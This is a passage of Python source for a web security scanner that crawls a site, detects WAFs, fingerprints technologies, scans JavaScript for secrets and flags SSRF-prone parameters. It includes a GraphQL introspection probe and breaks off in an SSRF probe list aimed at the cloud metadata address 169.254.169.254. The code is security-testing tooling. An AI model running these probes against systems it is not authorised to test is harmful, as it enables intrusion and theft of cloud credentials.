# ═══════════════════════════════════════════════════════════════════════════

class WAFDetector:
    """Detects WAF presence and adjusts scan strategy accordingly."""

    WAF_SIGNATURES: Dict[str, List[str]] = {
        "Cloudflare":   ["cf-ray", "cloudflare", "__cfduid", "cf_clearance"],
        "Akamai":       ["akamai", "akamaighost", "x-akamai"],
        "Imperva":      ["x-iinfo", "x-cdn", "incap_ses", "visid_incap"],
        "AWS WAF":      ["x-amzn-requestid", "x-amz-cf-id"],
        "Sucuri":       ["x-sucuri-id", "x-sucuri-cache"],
        "F5 BIG-IP":    ["bigipserver", "f5-bigip"],
        "Barracuda":    ["barra_counter_session"],
        "Fortinet":     ["fortigate", "fortiweb"],
        "ModSecurity":  ["mod_security", "modsecurity"],
    }

    def detect(self, resp: requests.Response) -> Optional[str]:
        if not resp:
            return None
        headers_str = str(resp.headers).lower()
        body_str    = resp.text[:2000].lower() if resp.text else ""
        combined    = headers_str + body_str
        for waf, sigs in self.WAF_SIGNATURES.items():
            if any(sig.lower() in combined for sig in sigs):
                return waf
        return None

    def is_blocked(self, resp: requests.Response) -> bool:
        if not resp:
            return True
        if resp.status_code in (403, 406, 429, 503):
            blocked_phrases = ["blocked", "forbidden", "access denied",
                               "security", "firewall", "rate limit"]
            body = resp.text[:1000].lower() if resp.text else ""
            return any(p in body for p in blocked_phrases)
        return False


# ═══════════════════════════════════════════════════════════════════════════
#  MAIN SCANNER
# ═══════════════════════════════════════════════════════════════════════════

class AdvancedContentScanner:
    """
    Advanced Content Scanner v4.0 — Nirvana Edition
    Full L1-L5 security scanner for Analysis Tool v3.0.0
    """

    VERSION = "4.0.0"

    def __init__(
        self,
        domain: str,
        output_dir: Optional[str] = None,
        max_depth: int = 3,
        max_pages: int = 200,
        timeout: int = 12,
        max_workers: int = 15,
        verify_ssl: bool = True,
        log_level: str = "INFO",
        log_file: Optional[str] = None,
        auth=None,
        user_agent: Optional[str] = None,
        respect_robots: bool = True,
        rate_limit: float = 0.15,
        custom_patterns: Optional[Dict] = None,
        oob_callback_domain: Optional[str] = None,
        include_subdomains: bool = False,
        resume: bool = False,
        min_severity: str = "Low",
        # L2 — Active testing
        active_scan: bool = True,
        nuclei_path: Optional[str] = None,
        fuzz_forms: bool = True,
        test_auth_bypass: bool = True,
        test_cors: bool = True,
        # L3 — Smart analysis
        taint_tracking: bool = True,
        # L4 — Headless browser
        headless: bool = False,        # requires playwright
        # L5 — Agent behaviors
        adaptive_waf: bool = True,
        build_exploit_chains: bool = True,
    ):
        if not isinstance(domain, str) or not domain.strip():
            raise ValueError("domain must be a non-empty string")

        self.domain        = domain.lower().strip().rstrip("/")
        self.base_url      = self.domain if self.domain.startswith(("http://", "https://")) else f"https://{self.domain}"
        parsed             = urlparse(self.base_url)
        self.domain_netloc = parsed.netloc
        self.domain_root   = self._root_domain(self.domain_netloc)

        self.output_dir          = output_dir or os.path.join(os.getcwd(), "results", self.domain_netloc)
        self.max_depth           = max_depth
        self.max_pages           = max_pages
        self.timeout             = timeout
        self.max_workers         = max_workers
        self.verify_ssl          = verify_ssl
        self.auth                = auth
        self.respect_robots      = respect_robots
        self.rate_limit          = rate_limit
        self.oob_callback_domain = oob_callback_domain
        self.include_subdomains  = include_subdomains
        self.resume              = resume
        self.min_severity        = min_severity.lower()
        self._sev_order          = {"low": 0, "medium": 1, "high": 2, "critical": 3}

        # Feature flags
        self.active_scan         = active_scan
        self.nuclei_path         = nuclei_path or shutil.which("nuclei")
        self.fuzz_forms          = fuzz_forms
        self.test_auth_bypass    = test_auth_bypass
        self.test_cors           = test_cors
        self.taint_tracking      = taint_tracking
        self.headless            = headless and PLAYWRIGHT_AVAILABLE
        self.adaptive_waf        = adaptive_waf
        self.build_exploit_chains= build_exploit_chains

        os.makedirs(self.output_dir, exist_ok=True)
        self._setup_logging(log_level, log_file)

        self.patterns    = PatternRegistry()
        self.taint_tracker = TaintFlowTracker()
        self.waf_detector  = WAFDetector()
        if custom_patterns:
            self._merge_custom_patterns(custom_patterns)

        self.session = self._build_session(user_agent)

        self._lock                   = threading.Lock()
        self._seen_hashes: Set[str]  = set()
        self._finding_counters: Dict[str, int] = defaultdict(int)
        self.visited_urls: Set[str]  = set()
        self.crawled_pages           = 0
        self.js_files: Dict[str, str] = {}
        self.api_endpoints: Set[str] = set()
        self.robots_disallowed: Set[str] = set()
        self._last_req_times: Dict[int, float] = {}
        self._shutdown               = threading.Event()
        self._extra_sitemaps: List[str] = []
        self._detected_waf: Optional[str] = None
        self._waf_triggered_count    = 0
        self._tech_fingerprint: Dict[str, str] = {}
        self._dynamic_routes: Set[str] = set()

        self.findings: Dict[str, Any] = {
            "secrets":              [],
            "js_vulnerabilities":   [],
            "ssrf_vulnerabilities": [],
            "active_vulnerabilities": [],
            "security_headers":     [],
            "exposed_endpoints":    [],
            "exploit_chains":       [],
            "summary":              {},
        }

        if self.respect_robots:
            self._process_robots_txt()

        self._state_file = os.path.join(self.output_dir, f".state_{self.domain_netloc}.json")
        if resume:
            self._load_state()

        signal.signal(signal.SIGINT, self._on_sigint)

    # ──────────────────────────────────────────────────────────────────────
    # SETUP
    # ──────────────────────────────────────────────────────────────────────

    def _setup_logging(self, level: str, log_file: Optional[str]):
        lvl = {"DEBUG": 10, "INFO": 20, "WARNING": 30, "ERROR": 40, "CRITICAL": 50}
        self.logger = logging.getLogger(f"ACS.{self.domain_netloc}")
        self.logger.setLevel(lvl.get(level.upper(), 20))
        self.logger.handlers.clear()
        self.logger.propagate = False
        ch = logging.StreamHandler()
        ch.setFormatter(logging.Formatter("[%(levelname)s] %(message)s"))
        self.logger.addHandler(ch)
        if log_file:
            fh = RotatingFileHandler(log_file, maxBytes=10 * 1024 * 1024, backupCount=5)
            fh.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(name)s: %(message)s"))
            self.logger.addHandler(fh)

    def _build_session(self, ua: Optional[str]) -> requests.Session:
        s = requests.Session()
        retry = Retry(total=3, backoff_factor=0.5,
                      status_forcelist=[429, 500, 502, 503, 504],
                      allowed_methods=["GET", "HEAD", "POST", "OPTIONS"])
        adapter = HTTPAdapter(max_retries=retry, pool_maxsize=self.max_workers + 5)
        s.mount("http://", adapter)
        s.mount("https://", adapter)
        s.headers.update({
            "User-Agent": ua or (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/124.0.0.0 Safari/537.36"
            ),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
        })
        if self.auth:
            s.auth = self.auth
        return s

    def _merge_custom_patterns(self, cp: Dict):
        if "secrets"     in cp: self.patterns.SECRETS.update(cp["secrets"])
        if "js_security" in cp:
            for cat, pats in cp["js_security"].items():
                self.patterns.JS_SECURITY.setdefault(cat, []).extend(pats)
        if "ssrf_params" in cp: self.patterns.SSRF_PARAMS.extend(cp["ssrf_params"])

    @staticmethod
    def _root_domain(netloc: str) -> str:
        parts = netloc.split(".")
        return ".".join(parts[-2:]) if len(parts) >= 2 else netloc

    def _on_sigint(self, sig, frame):
        self.logger.warning("Interrupted — saving state…")
        self._shutdown.set()

    # ──────────────────────────────────────────────────────────────────────
    # HTTP + WAF ADAPTIVE
    # ──────────────────────────────────────────────────────────────────────

    def _throttle(self):
        tid  = threading.get_ident()
        now  = time.monotonic()
        wait = self.rate_limit - (now - self._last_req_times.get(tid, 0))
        if wait > 0:
            time.sleep(wait)
        self._last_req_times[tid] = time.monotonic()

    def _make_request(self, method: str, url: str, **kw) -> Optional[requests.Response]:
        self._throttle()
        kw.setdefault("timeout", self.timeout)
        kw.setdefault("verify", self.verify_ssl)
        try:
            resp = self.session.request(method, url, **kw)
            # WAF detection (L5 adaptive)
            if self.adaptive_waf and resp:
                if not self._detected_waf:
                    waf = self.waf_detector.detect(resp)
                    if waf:
                        self._detected_waf = waf
                        self.logger.info(f"[WAF] Detected: {waf} — adjusting rate limit")
                        self.rate_limit = max(self.rate_limit, 0.5)
                if self.waf_detector.is_blocked(resp):
                    self._waf_triggered_count += 1
                    if self._waf_triggered_count > 5:
                        self.logger.warning("[WAF] Multiple blocks detected — backing off 3s")
                        time.sleep(3)
                        self._waf_triggered_count = 0
            return resp
        except requests.exceptions.SSLError:
            try:
                kw["verify"] = False
                return self.session.request(method, url, **kw)
            except Exception:
                return None
        except requests.exceptions.RequestException as e:
            self.logger.debug(f"Request {url}: {e}")
            return None

    # ──────────────────────────────────────────────────────────────────────
    # URL UTILITIES
    # ──────────────────────────────────────────────────────────────────────

    def _in_scope(self, url: str) -> bool:
        netloc = urlparse(url).netloc
        if not netloc: return True
        if netloc == self.domain_netloc: return True
        if self.include_subdomains and netloc.endswith("." + self.domain_root): return True
        return False

    _SKIP_EXT = frozenset([
        ".pdf",".jpg",".jpeg",".png",".gif",".webp",".svg",".ico",".bmp",".tiff",
        ".css",".woff",".woff2",".ttf",".eot",".otf",
        ".mp4",".mp3",".avi",".mov",".wmv",
        ".zip",".rar",".tar",".gz",".7z",".exe",".dmg",
        ".doc",".docx",".ppt",".pptx",".xls",".xlsx",".csv",
    ])

    def _is_crawlable(self, url: str) -> bool:
        if not url or not url.startswith(("http://", "https://")): return False
        if os.path.splitext(urlparse(url).path.lower())[1] in self._SKIP_EXT: return False
        if not self._in_scope(url): return False
        if not self._url_allowed(url): return False
        return True

    def _is_external_lib(self, url: str) -> bool:
        host = urlparse(url).netloc.lower()
        if not host or host == self.domain_netloc: return False
        if self.domain_root and host.endswith("." + self.domain_root): return False
        return host in PatternRegistry.EXTERNAL_LIB_HOSTS

    # ──────────────────────────────────────────────────────────────────────
    # ROBOTS.TXT
    # ──────────────────────────────────────────────────────────────────────

    def _process_robots_txt(self):
        try:
            resp = self._make_request("GET", urljoin(self.base_url, "/robots.txt"))
            if not resp or resp.status_code != 200: return
            ua_match = False
            for raw in resp.text.splitlines():
                line = raw.strip(); ll = line.lower()
                if ll.startswith("user-agent:"):
                    ua_match = (ll[11:].strip() == "*")
                if ua_match and ll.startswith("disallow:"):
                    path = line[9:].strip()
                    if path:
                        self.robots_disallowed.add(
                            "^" + re.escape(path).replace(r"\*", ".*").replace(r"\?", ".?")
                        )
                if ll.startswith("sitemap:"):
                    sm = line[8:].strip()
                    if sm: self._extra_sitemaps.append(sm)
        except Exception as e:
            self.logger.debug(f"robots.txt: {e}")

    def _url_allowed(self, url: str) -> bool:
        if not self.respect_robots or not self.robots_disallowed: return True
        path = urlparse(url).path
        return not any(re.match(p, path) for p in self.robots_disallowed)

    # ──────────────────────────────────────────────────────────────────────
    # FINDING HELPERS
    # ──────────────────────────────────────────────────────────────────────

    def _is_new(self, h: str) -> bool:
        with self._lock:
            if h in self._seen_hashes: return False
            self._seen_hashes.add(h); return True

    def _next_id(self, cat: str) -> int:
        with self._lock:
            self._finding_counters[cat] += 1
            return self._finding_counters[cat]

    def _add_finding(self, cat: str, finding):
        with self._lock:
            self.findings[cat].append(
                asdict(finding) if hasattr(finding, "__dataclass_fields__") else finding
            )

    def _risk_score(self, severity: str, confidence: str, entropy: float = 0) -> float:
        """CVSS-inspired composite risk score 0–10."""
        base   = PatternRegistry.SEV_WEIGHT.get(severity, 2.0)
        conf_m = {"HIGH": 1.0, "MEDIUM": 0.7, "LOW": 0.4}.get(confidence, 0.5)
        entr_m = min(entropy / 5.0, 1.0) if entropy > 0 else 1.0
        return round(min(base * conf_m * entr_m + (entr_m * 0.5), 10.0), 2)

    # ──────────────────────────────────────────────────────────────────────
    # L1 — CRAWL ENGINE
    # ──────────────────────────────────────────────────────────────────────

    def crawl_website(self) -> Dict:
        self.logger.info(
            f"[v{self.VERSION}] {self.base_url}  "
            f"depth={self.max_depth} pages={self.max_pages} workers={self.max_workers}"
        )
        start = time.monotonic()

        wq: queue.Queue = queue.Queue()
        wq.put((self.base_url, 0))
        for u in self._collect_sitemap_urls():
            if u not in self.visited_urls:
                wq.put((u, 1))

        def worker():
            while not self._shutdown.is_set():
                try:
                    url, depth = wq.get(timeout=3)
                except queue.Empty:
                    break
                try:
                    with self._lock:
                        if url in self.visited_urls or self.crawled_pages >= self.max_pages:
                            wq.task_done(); continue
                        self.visited_urls.add(url)
                        self.crawled_pages += 1
                        cnt = self.crawled_pages
                    if not self._is_crawlable(url):
                        wq.task_done(); continue
                    if cnt % 20 == 0:
                        self.logger.info(f"[CRAWL] {cnt}/{self.max_pages} pages")
                    self._process_url(url, depth, wq)
                except Exception as e:
                    self.logger.error(f"Worker {url}: {e}")
                finally:
                    wq.task_done()

        threads = [threading.Thread(target=worker, daemon=True) for _ in range(self.max_workers)]
        for t in threads: t.start()
        wq.join()
        for t in threads: t.join(timeout=5)

        return start

    def _process_url(self, url: str, depth: int, wq: queue.Queue):
        resp = self._make_request("GET", url)
        if not resp: return
        self._check_security_headers(resp, url)
        self._fingerprint_tech(resp, url)
        ct = resp.headers.get("Content-Type", "").lower()

        if resp.status_code == 200 and "text/html" in ct:
            soup = BeautifulSoup(resp.text, "html.parser")
            self._harvest_links(soup, url, depth, wq)
            self._process_script_tags(soup, url)
            self._check_forms_ssrf(soup, url)
            self._extract_api_endpoints(resp.text, url)
            self._scan_json_blobs(soup, url)
            if self.active_scan:
                self._test_forms_active(soup, url)

        elif resp.status_code == 200 and ("javascript" in ct or url.lower().endswith((".js", ".mjs", ".cjs"))):
            if not self._is_external_lib(url):
                with self._lock: self.js_files[url] = resp.text
                self._analyze_js(resp.text, url)
                self._scan_secrets(resp.text, url)
                self._extract_api_endpoints(resp.text, url)
                self._follow_source_map(resp, url, wq)

        elif url.endswith(".map"):
            self._scan_secrets(resp.text, url)

        self._check_url_params_ssrf(url)

    # ──────────────────────────────────────────────────────────────────────
    # L1 — LINK HARVESTING
    # ──────────────────────────────────────────────────────────────────────

    def _harvest_links(self, soup: BeautifulSoup, base: str, depth: int, wq: queue.Queue):
        if depth >= self.max_depth: return
        candidates: Set[str] = set()
        for tag in soup.find_all("a", href=True): candidates.add(tag["href"].strip())
        for tag in soup.find_all(True, attrs={"data-src": True}): candidates.add(tag["data-src"].strip())
        for tag in soup.find_all(True, attrs={"data-href": True}): candidates.add(tag["data-href"].strip())
        for tag in soup.find_all("link", href=True):
            if any(r in " ".join(tag.get("rel", [])).lower() for r in ("preload", "prefetch", "next", "prev")):
                candidates.add(tag["href"].strip())
        for tag in soup.find_all("meta", attrs={"http-equiv": re.compile(r"refresh", re.I)}):
            m = re.search(r"url=(.+)", tag.get("content", ""), re.IGNORECASE)
            if m: candidates.add(m.group(1).strip().strip("'\""))
        for tag in soup.find_all("form", action=True): candidates.add(tag["action"].strip())

        for href in candidates:
            if not href or href.startswith(("javascript:", "#", "mailto:", "tel:", "data:")): continue
            abs_url = urljoin(base, href).split("#")[0].rstrip("?")
            if not abs_url.startswith(("http://", "https://")): continue
            with self._lock:
                if abs_url not in self.visited_urls:
                    wq.put((abs_url, depth + 1))

    # ──────────────────────────────────────────────────────────────────────
    # L1 — SITEMAP + SOURCE MAP
    # ──────────────────────────────────────────────────────────────────────

    def _collect_sitemap_urls(self) -> List[str]:
        to_check = ["/sitemap.xml", "/sitemap_index.xml", "/sitemaps/sitemap.xml"] + self._extra_sitemaps
        collected: List[str] = []; visited_sm: Set[str] = set()

        def _parse(url: str):
            if url in visited_sm: return
            visited_sm.add(url)
            try:
                resp = self._make_request("GET", url)
                if not resp or resp.status_code != 200: return
                ct = resp.headers.get("Content-Type", "")
                if "xml" not in ct and not url.endswith((".xml", ".xml.gz")): return
                try: soup = BeautifulSoup(resp.text, "lxml-xml")
                except Exception: soup = BeautifulSoup(resp.text, "html.parser")
                for sm_tag in soup.find_all("sitemap"):
                    loc = sm_tag.find("loc")
                    if loc and loc.text.strip(): _parse(loc.text.strip())
                for loc in soup.find_all("loc"):
                    u = loc.text.strip()
                    if u: collected.append(u)
            except Exception as e:
                self.logger.debug(f"Sitemap {url}: {e}")

        for path in to_check:
            full = path if path.startswith("http") else urljoin(self.base_url, path)
            _parse(full)
        return [u for u in collected if self._is_crawlable(u)]

    def _follow_source_map(self, resp: requests.Response, js_url: str, wq: queue.Queue):
        sm = resp.headers.get("X-SourceMap") or resp.headers.get("SourceMap")
        if not sm:
            match = re.search(r"//[#@]\s*sourceMappingURL=(\S+)", resp.text)
            sm = match.group(1) if match else None
        if sm and not sm.startswith("data:"):
            abs_map = urljoin(js_url, sm)
            self.logger.info(f"[SOURCEMAP] {abs_map}")
            with self._lock:
                if abs_map not in self.visited_urls:
                    wq.put((abs_map, 0))

    # ──────────────────────────────────────────────────────────────────────
    # L1 — SECURITY HEADERS
    # ──────────────────────────────────────────────────────────────────────

    def _check_security_headers(self, resp: requests.Response, url: str):
        origin = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
        if not self._is_new(f"hdr:{origin}"): return
        for hdr, cfg in self.patterns.SECURITY_HEADERS.items():
            val = resp.headers.get(hdr)
            try: ok = cfg["check"](val)
            except Exception: ok = False
            if not ok:
                f = SecurityHeaderFinding(
                    id=self._next_id("security_headers"),
                    type="Missing/Weak Security Header",
                    source_url=url, header_name=hdr,
                    header_value=val or "(not present)",
                    severity=cfg["severity"], recommendation=cfg["rec"],
                )
                self._add_finding("security_headers", f)

    # ──────────────────────────────────────────────────────────────────────
    # L1 — TECH FINGERPRINTING (feeds L2 targeted CVE scan)
    # ──────────────────────────────────────────────────────────────────────

    def _fingerprint_tech(self, resp: requests.Response, url: str):
        if not self._is_new(f"tech:{self.domain_netloc}"): return
        headers = resp.headers
        body    = resp.text[:5000] if resp.text else ""

        checks = [
            ("X-Powered-By",    headers.get("X-Powered-By", "")),
            ("Server",          headers.get("Server", "")),
            ("Generator",       re.search(r'<meta[^>]+name=["\']generator["\'][^>]+content=["\']([^"\']+)', body, re.IGNORECASE)),
            ("WordPress",       "wp-content" in body or "wp-includes" in body),
            ("Drupal",          'Drupal.settings' in body or 'drupal.org' in body),
            ("Joomla",          '/components/com_' in body),
            ("Laravel",         "laravel_session" in str(headers)),
            ("Django",          "csrfmiddlewaretoken" in body),
            ("Next.js",         "__NEXT_DATA__" in body),
            ("Nuxt.js",         "__NUXT__" in body or "__NUXT_DATA__" in body),
            ("React",           "react-root" in body or "_reactRootContainer" in body),
            ("Vue.js",          "vue-router" in body or "__vue_router__" in body),
            ("Angular",         "ng-version" in body or "ng-app" in body),
        ]
        for name, value in checks:
            if isinstance(value, bool) and value:
                self._tech_fingerprint[name] = "detected"
            elif isinstance(value, str) and value:
                self._tech_fingerprint[name] = value[:80]
            elif hasattr(value, "group"):
                self._tech_fingerprint[name] = value.group(1)[:80]
        if self._tech_fingerprint:
            self.logger.info(f"[TECH] {self._tech_fingerprint}")

    # ──────────────────────────────────────────────────────────────────────
    # L1 — JSON BLOBS
    # ──────────────────────────────────────────────────────────────────────

    def _scan_json_blobs(self, soup: BeautifulSoup, page_url: str):
        for tag_id in ("__NEXT_DATA__", "__NUXT_DATA__"):
            tag = soup.find("script", id=tag_id)
            if tag and tag.string:
                self._scan_secrets(tag.string, f"{page_url}#{tag_id}")
                self._extract_api_endpoints(tag.string, page_url)
        for tag in soup.find_all("script", type=re.compile(r"application/(json|ld\+json)", re.I)):
            if tag.string and len(tag.string.strip()) > 20:
                key = f"{page_url}#json:{self._shash(tag.string)}"
                self._scan_secrets(tag.string, key)
                self._extract_api_endpoints(tag.string, page_url)

    # ──────────────────────────────────────────────────────────────────────
    # L1 — JS PROCESSING
    # ──────────────────────────────────────────────────────────────────────

    def _process_script_tags(self, soup: BeautifulSoup, page_url: str):
        for tag in soup.find_all("script"):
            if tag.string and len(tag.string.strip()) >= 30:
                content = tag.string
                key = f"{page_url}#inline:{self._shash(content)}"
                with self._lock:
                    if key not in self.js_files: self.js_files[key] = content
                self._analyze_js(content, key)
                self._scan_secrets(content, key)
            raw_src = tag.get("src", "").strip()
            if raw_src:
                if raw_src.startswith("//"): raw_src = "https:" + raw_src
                js_url = urljoin(page_url, raw_src)
                if not self._is_external_lib(js_url) and js_url not in self.js_files:
                    self._fetch_and_process_js(js_url)

    def _fetch_and_process_js(self, js_url: str):
        with self._lock:
            if js_url in self.js_files: return
            self.js_files[js_url] = ""
        resp = self._make_request("GET", js_url)
        if not resp or resp.status_code != 200: return
        content = resp.text
        if len(content.strip()) < 30: return
        with self._lock: self.js_files[js_url] = content
        self._analyze_js(content, js_url)
        self._scan_secrets(content, js_url)
        self._extract_api_endpoints(content, js_url)

    # ──────────────────────────────────────────────────────────────────────
    # L1+L3 — JS ANALYSIS + TAINT TRACKING
    # ──────────────────────────────────────────────────────────────────────

    def _analyze_js(self, content: str, source_url: str):
        if self._is_external_lib(source_url): return
        is_minified = len(content) > 3000 and content.count("\n") < max(10, len(content) // 500)

        # L3: taint flow analysis
        taint_chains = []
        if self.taint_tracking:
            taint_chains = self.taint_tracker.find_taint_chains(content, source_url)
            for chain in taint_chains:
                f = JSVulnFinding(
                    id=self._next_id("js_vulnerabilities"),
                    type="Taint Flow: Source → Sink",
                    source_url=source_url,
                    line=chain["sink_line"],
                    matched_code=chain["sink_code"],
                    code_context=f"Tainted var '{chain['tainted_variable']}' flows to sink",
                    taint_chain=[
                        f"Source lines: {chain['source_lines']}",
                        f"Sink: {chain['sink_pattern']}",
                        f"Sink line: {chain['sink_line']}",
                    ],
                    severity="High",
                    confidence="HIGH",
                    risk_score=self._risk_score("High", "HIGH"),
                    description=f"User-controlled variable '{chain['tainted_variable']}' reaches dangerous sink.",
                    recommendation="Sanitize all user-controlled data before passing to DOM sinks.",
                    poc=f"Trace variable '{chain['tainted_variable']}' from line {chain['source_lines']} to line {chain['sink_line']}",
                )
                if self._is_new(f.hash): self._add_finding("js_vulnerabilities", asdict(f))

        # Pattern-based analysis
        for category, pat_list in self.patterns.JS_SECURITY.items():
            sev = self._js_sev(category)
            if not self._sev_passes(sev): continue
            for entry in pat_list:
                pat, conf = entry["p"], entry["c"]
                if is_minified and conf != "HIGH": continue
                for m in re.finditer(pat, content, re.IGNORECASE | re.MULTILINE):
                    if "Math.random" in m.group(0):
                        ctx60 = content[max(0, m.start()-60): m.end()+60].lower()
                        if not any(t in ctx60 for t in ("token", "secret", "key", "salt", "nonce")): continue
                    line_no   = content[: m.start()].count("\n") + 1
                    ctx_start = max(0, m.start() - 160)
                    ctx_end   = min(len(content), m.end() + 160)
                    ctx       = content[ctx_start:ctx_end].replace("\n", " ").strip()
                    f = JSVulnFinding(
                        id=self._next_id("js_vulnerabilities"),
                        type=category,
                        source_url=source_url,
                        line=line_no,
                        matched_code=m.group(0)[:250],
                        code_context=ctx[:500],
                        taint_chain=[],
                        severity=sev,
                        confidence=conf,
                        risk_score=self._risk_score(sev, conf),
                        description=self._js_desc(category),
                        recommendation=self._js_rec(category),
                        poc=self._js_poc(category, m.group(0), source_url),
                    )
                    if self._is_new(f.hash):
                        self._add_finding("js_vulnerabilities", asdict(f))
                        if sev in ("High", "Critical"):
                            self.logger.warning(f"[JS] {sev}/{conf} — {category} @ {source_url}:{line_no}")

    @staticmethod
    def _js_sev(cat: str) -> str:
        HIGH = {
            "DOM XSS", "Open Redirect", "Dynamic Code Execution",
            "Prototype Pollution", "WebSocket Plaintext",
            "Weak / Broken Crypto", "Path Traversal",
            "JSONP Callback Injection", "Server-Side Request Forgery (JS)",
            "Debug / Secret Console Leak", "Taint Flow: Source → Sink",
        }
        return "High" if cat in HIGH else "Medium"

    # ──────────────────────────────────────────────────────────────────────
    # L1+L3 — SECRET SCANNING
    # ──────────────────────────────────────────────────────────────────────

    def _scan_secrets(self, content: str, source_url: str):
        if self._is_external_lib(source_url): return
        for name, cfg in self.patterns.SECRETS.items():
            pat      = cfg["pattern"]
            min_entr = cfg.get("min_entropy", 3.5)
            sev      = cfg.get("severity", "Medium")
            grp      = cfg.get("group", 0)
            if not self._sev_passes(sev): continue
            for m in re.finditer(pat, content, re.IGNORECASE | re.MULTILINE):
                raw = m.group(grp) if grp and m.lastindex and grp <= m.lastindex else m.group(0)
                if not raw: continue
                entr = self._entropy(raw)
                if entr < min_entr: continue
                if "Generic" in name and len(raw) > 128: continue
                if self._fp_value(raw): continue
                ctx_s = max(0, m.start() - 130)
                ctx_e = min(len(content), m.end() + 130)
                ctx   = content[ctx_s:ctx_e].replace("\n", " ").strip()
                if self._fp_context(ctx): continue
                line_no = content[: m.start()].count("\n") + 1
                confidence = "HIGH" if entr >= min_entr + 1.0 else "MEDIUM"
                f = SecretFinding(
                    id=self._next_id("secrets"),
                    type=name, source_url=source_url, line=line_no,
                    masked_value=self._mask(raw), raw_length=len(raw),
                    entropy=round(entr, 3), context=ctx[:320],
                    severity=sev, confidence=confidence,
                    risk_score=self._risk_score(sev, confidence, entr),
                    recommendation=self._sec_rec(name),
                )
                if self._is_new(f.hash):
                    self._add_finding("secrets", asdict(f))
                    self.logger.warning(f"[SECRET] {sev} — {name} @ {source_url}:{line_no} (H={entr:.2f})")

    # ──────────────────────────────────────────────────────────────────────
    # L1 — API ENDPOINT EXTRACTION
    # ──────────────────────────────────────────────────────────────────────

    _API_RE = [
        r'(?<![A-Za-z0-9_\-])/api/v\d+/[A-Za-z0-9_\-/]{2,60}',
        r'(?<![A-Za-z0-9_\-])/api/[A-Za-z0-9_\-/]{2,60}',
        r'(?<![A-Za-z0-9_\-])/graphql(?:/[A-Za-z0-9_\-]*)?',
        r'(?<![A-Za-z0-9_\-])/gql(?:/[A-Za-z0-9_\-]*)?',
        r'(?<![A-Za-z0-9_\-])/rest/v?\d+/[A-Za-z0-9_\-/]{2,60}',
        r'(?<![A-Za-z0-9_\-])/v\d+/[A-Za-z0-9_\-/]{2,60}',
        r'(?<![A-Za-z0-9_\-])/ajax/[A-Za-z0-9_\-/]{2,60}',
        r'(?<![A-Za-z0-9_\-])/rpc/[A-Za-z0-9_\-/]{2,60}',
        r'(?<![A-Za-z0-9_\-])/wp-json/[A-Za-z0-9_\-/]{2,60}',
        r'"(https?://[^"]{8,120})"',
        r"'(https?://[^']{8,120})'",
    ]

    def _extract_api_endpoints(self, content: str, source_url: str):
        for pat in self._API_RE:
            for m in re.finditer(pat, content):
                raw  = m.group(1) if m.lastindex else m.group(0)
                full = urljoin(source_url, raw)
                try:
                    if validators.url(full) and self._in_scope(full):
                        with self._lock: self.api_endpoints.add(full)
                except Exception: pass
        if "/graphql" in source_url.lower() or "/gql" in source_url.lower():
            self._probe_graphql(source_url)

    def _probe_graphql(self, url: str):
        if not self._is_new(f"graphql:{url}"): return
        try:
            resp = self._make_request("POST", url,
                json={"query": "{__schema{queryType{name}}}"},
                headers={"Content-Type": "application/json"}, timeout=8)
            if resp and resp.status_code == 200 and "__schema" in resp.text:
                self._add_finding("js_vulnerabilities", {
                    "id": self._next_id("js_vulnerabilities"),
                    "type": "GraphQL Introspection Enabled",
                    "source_url": url, "severity": "Medium", "confidence": "HIGH",
                    "risk_score": self._risk_score("Medium", "HIGH"),
                    "taint_chain": [],
                    "description": "GraphQL introspection publicly enabled — exposes full API schema.",
                    "recommendation": "Disable introspection in production.",
                    "poc": f"POST {url} — {{\"query\":\"{{__schema{{types{{name}}}}}}\"}}"
                })
                self.logger.warning(f"[GRAPHQL] Introspection: {url}")
        except Exception as e:
            self.logger.debug(f"GraphQL: {e}")

    # ──────────────────────────────────────────────────────────────────────
    # L1 — SSRF
    # ──────────────────────────────────────────────────────────────────────

    def _check_forms_ssrf(self, soup: BeautifulSoup, page_url: str):
        for form in soup.find_all("form"):
            action = form.get("action", ""); method = form.get("method", "get").lower()
            vulns  = []
            for field in form.find_all(["input", "textarea", "select"]):
                fname = field.get("name", "").lower()
                ftype = field.get("type", "").lower()
                fval  = field.get("value", "") or field.get("placeholder", "") or field.get("default", "")
                if not fname: continue
                if (any(p in fname for p in self.patterns.SSRF_PARAMS)
                        or ftype == "url"
                        or bool(re.match(r"https?://", fval.strip()))):
                    vulns.append(fname)
            if vulns:
                f = SSRFVulnFinding(
                    id=self._next_id("ssrf_vulnerabilities"),
                    type="Potential SSRF — Form Input",
                    source_url=page_url,
                    vulnerable_parameters=vulns,
                    form_action=urljoin(page_url, action),
                    method=method, confirmed=False,
                    poc=f"{method.upper()} {urljoin(page_url, action)} — params: {', '.join(vulns)}",
                    severity="Medium", confidence="MEDIUM",
                    risk_score=self._risk_score("Medium", "MEDIUM"),
                    description="Form fields with URL-related names may be forwarded to server-side requests.",
                    recommendation="Validate and allowlist accepted URL schemes/hosts server-side.",
                )
                if self._is_new(f.hash): self._add_finding("ssrf_vulnerabilities", asdict(f))

    def _check_url_params_ssrf(self, url: str):
        params = dict(urllib.parse.parse_qsl(urlparse(url).query))
        vulns  = [k for k in params if any(p in k.lower() for p in self.patterns.SSRF_PARAMS)]
        if vulns:
            f = SSRFVulnFinding(
                id=self._next_id("ssrf_vulnerabilities"),
                type="Potential SSRF — URL Parameter",
                source_url=url, vulnerable_parameters=vulns,
                form_action=url, method="get", confirmed=False,
                poc=f"GET {url}",
                severity="Medium", confidence="MEDIUM",
                risk_score=self._risk_score("Medium", "MEDIUM"),
                description="URL query params with SSRF-associated names detected.",
                recommendation="Validate all URL-type query parameters server-side.",
            )
            if self._is_new(f.hash): self._add_finding("ssrf_vulnerabilities", asdict(f))

    def _probe_endpoint_ssrf(self, endpoint: str):
        try:
            parsed = urlparse(endpoint)
            if parsed.scheme not in ("http", "https") or not self._in_scope(endpoint): return
            existing = dict(urllib.parse.parse_qsl(parsed.query))
            if len(existing) > 15: return
            oob = f"http://{self._shash(endpoint)}.{self.oob_callback_domain}" if self.oob_callback_domain else None
            probes = [oob] if oob else [
                "http://169.254.169.254/latest/meta-data/",
